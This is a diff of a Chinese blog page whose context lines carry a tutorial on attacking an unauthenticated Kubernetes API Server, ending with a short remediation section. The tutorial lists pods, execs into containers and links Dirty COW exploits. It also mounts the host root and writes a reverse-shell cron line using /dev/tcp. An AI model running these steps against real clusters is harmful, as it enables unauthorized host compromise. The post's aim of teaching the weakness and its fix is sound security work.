@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1562035576092">
+<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1577780469594">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://brick713.github.io/styles/main.css">
 
@@ -45,7 +45,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://brick713.github.io">
-        <img src="https://brick713.github.io/images/avatar.png?v=1562035576092" class="site-logo">
+        <img src="https://brick713.github.io/images/avatar.png?v=1577780469594" class="site-logo">
         <h1 class="site-title">Brick713 的小黑屋</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -102,7 +102,7 @@
         
       
         
-          <a class="social-link" href="https://www.zhihu.com/people/Brick713" target="_blank">
+          <a class="social-link" href="https://www.zhihu.com/people/brick713" target="_blank">
             <i class="fab fa-zhihu"></i>
           </a>
         
@@ -138,7 +138,7 @@
 <li>Secure Port （默认6443）</li>
 </ol>
 <p>这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。</p>
-<p><img src="https://i.loli.net/2018/12/05/5c07dec609ff5.png" alt="Web 页面"></p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/12/05/5c07dec609ff5.png" alt="Web 页面" loading="lazy"></figure>
 <p>正常情况下 Api Server 是有权限控制的，分三种：</p>
 <ol>
 <li>Authentication</li>
@@ -151,13 +151,13 @@
 <p>首先，通过下面命令，去发现已经存在的容器</p>
 <pre><code>kubectl -s ip:port  get pods
 </code></pre>
-<p><img src="https://i.loli.net/2018/12/05/5c07e27b68f05.png" alt="发现的容器"></p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/12/05/5c07e27b68f05.png" alt="发现的容器" loading="lazy"></figure>
 <p>然后直接连接这个容器获取 Shell。</p>
 <pre><code>kubectl -s ip:port  --namespace=default exec -it dockername bash
 </code></pre>
-<p><img src="https://i.loli.net/2018/12/06/5c07f8c667de8.png" alt="获取容器权限"></p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/12/06/5c07f8c667de8.png" alt="获取容器权限" loading="lazy"></figure>
 <p>这样就达到了控制容器的目的，但是容器的权限本身是不稳定的，如果宿主机本身的内核有问题的话，可以利用脏牛漏洞进行提权，获取宿主机的权限。具体可以参考：</p>
-<p><a href="https://github.com/scumjr/dirtycow-vdso">PoC for Dirty COW (CVE-2016-5195)</a>
+<p><a href="https://github.com/scumjr/dirtycow-vdso">PoC for Dirty COW (CVE-2016-5195)</a><br>
 <a href="https://github.com/gebl/dirtycow-docker-vdso">DDirtycow-docker-vdso</a></p>
 <p>第二种方式就比较厉害了，利用成功后造成的危害也最大。</p>
 <p>首先我们根据官方的规范新建一个标准文件 <code>myapp.yaml</code> ,当然也可以使用 json 格式的。</p>
@@ -179,20 +179,20 @@ spec:
 </code></pre>
 <p>其中的 image 可以更换，最好使用基础镜像。</p>
 <p>然后我们可以通过两种方式提交我们创建容器的请求，一种是通过他的 Web 页面（也就是默认的8080端口）</p>
-<p><img src="https://i.loli.net/2018/12/05/5c07e697f2044.png" alt="Web 端方式提交"></p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2018/12/05/5c07e697f2044.png" alt="Web 端方式提交" loading="lazy"></figure>
 <p>另外我们也可以通过他的另外的接口，通过 kubectl 客户端进行任务的提交。</p>
 <pre><code>kubectl -s  ip:port create -f yourfile
 </code></pre>
 <p>这里如果出现<code>Error from server (NotFound): the server could not find the requested resource</code>报错，可能是因为你的 kubectl 客户端和 kubernetes 的 server 端版本不相同导致的，一定要确保版本相同。</p>
-<p><img src="https://i.loli.net/2018/12/05/5c07edbf2b85e.png" alt="版本确认"></p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2018/12/05/5c07edbf2b85e.png" alt="版本确认" loading="lazy"></figure>
 <p>提交成功后，我们用之前命令获取容器的 bash，然后向容器的 <code>/mnt/etc/crontab</code> 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。</p>
 <pre><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab
 </code></pre>
 <p>接下来就是见证奇迹的时刻，耐心的等待你就能拿到 Shell 了，验证之后可以确认是宿主机的权限，而不是容器的权限</p>
-<p><img src="https://i.loli.net/2018/12/05/5c07e92f66a77.png" alt="获取宿主机权限"></p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2018/12/05/5c07e92f66a77.png" alt="获取宿主机权限" loading="lazy"></figure>
 <h1 id="0x01-漏洞修复">0x01 漏洞修复</h1>
 <p>在使用 kubernetes 的时候我们一定要进行身份的校验，K8S 的 APi 其实有非常严格的认证和授权</p>
-<p><img src="https://i.loli.net/2018/12/05/5c07ea3d72caa.png" alt="校验认证流程"></p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2018/12/05/5c07ea3d72caa.png" alt="校验认证流程" loading="lazy"></figure>
 <p>最简单的是在 Authentication 增加静态的 password，或者 token，可以的话关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生，可以参考 <a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-password-file">官方文档</a></p>
 
             </div>
